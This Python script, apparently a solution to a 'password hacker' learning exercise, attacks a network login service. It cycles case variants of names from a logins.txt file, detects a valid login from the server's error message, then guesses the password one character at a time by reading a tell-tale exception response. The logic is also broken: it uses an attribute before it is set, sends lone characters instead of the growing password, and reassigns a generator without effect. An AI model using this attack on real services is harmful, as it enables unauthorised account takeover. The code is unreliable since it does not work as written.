import sys
import socket
import itertools
import json
from string import ascii_uppercase, ascii_lowercase, digits


class PasswordHacker:
    def __init__(self):
        self.address = (sys.argv[1], int(sys.argv[2]))
        self.send_receive()
        self.login = None
        self.password = None
        self.generator = None

    def send_receive(self):

        with socket.socket() as c:
            c.connect(self.address)
            with open('logins.txt', 'r', encoding='utf-8') as logins:
                for log in logins:
                    for l in map(''.join, itertools.product(*(sorted({c.upper(), c.lower()}) for c in log))):
                        dictionary_send = {"login": l.strip(), "password": None}
                        c.send((json.dumps(dictionary_send)).encode())
                        data = c.recv(1024).decode()
                        dictionary_rcv = json.loads(data)
                        if dictionary_rcv['result'] == 'Wrong password!':
                            self.login = l.strip()
                            print(self.login)
                            self.generator = self.brute_force()
                            for i in self.generator:
                                dict_with_password = {"login": self.login, "password": i}
                                print(dict_with_password)
                                c.send((json.dumps(dict_with_password)).encode())
                                dict_pass_rcv = json.loads(c.recv(1024).decode())
                                print(dict_pass_rcv)
                                if dict_pass_rcv['result'] == 'Exception happened during login':
                                    self.password = self.password + i
                                    self.generator = self.brute_force()
                                    continue
                                elif dict_pass_rcv['result'] == 'Connection success!':
                                    print('Login:', self.login, 'Password:', self.password)
                                    exit()

    def brute_force(self):
        ascii_symbols = ascii_lowercase + ascii_uppercase + digits
        for i in ascii_symbols:
            yield i


if __name__ == '__main__':
    PasswordHacker()
